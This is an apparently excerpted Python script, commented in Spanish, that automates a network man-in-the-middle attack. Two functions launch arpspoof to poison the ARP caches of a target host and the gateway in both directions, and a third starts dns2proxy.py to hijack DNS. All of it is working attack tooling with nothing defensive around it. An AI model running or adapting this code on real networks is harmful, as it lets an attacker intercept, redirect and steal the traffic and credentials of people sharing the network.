...
def arpoof1(ip_intrusa, ip_gateway, wlan, **datos): 
	
	print("Lanzando ARPpoof 100%")
	process = Popen(['uxterm', '-e', 'arpspoof', '-i', wlan, '-t', ip_intrusa, ip_gateway], stdout=PIPE, stderr=PIPE)	
	stdout, stderr = process.communicate()
		
def arpoof2(ip_intrusa, ip_gateway, wlan):

	print("Lanzando ARPpoof 100%")
	process1 = Popen([ 'uxterm', '-e', 'arpspoof', '-i', wlan, '-t', ip_gateway, ip_intrusa ], stdout=PIPE, stderr=PIPE)	
	stdout, stderr = process1.communicate()	
		
def dnss():

	print("Activacion servidorDNS 100%")
	process2 = Popen(['uxterm', '-e', 'python', 'dns2proxy.py'], stdout=PIPE, stderr=PIPE)	
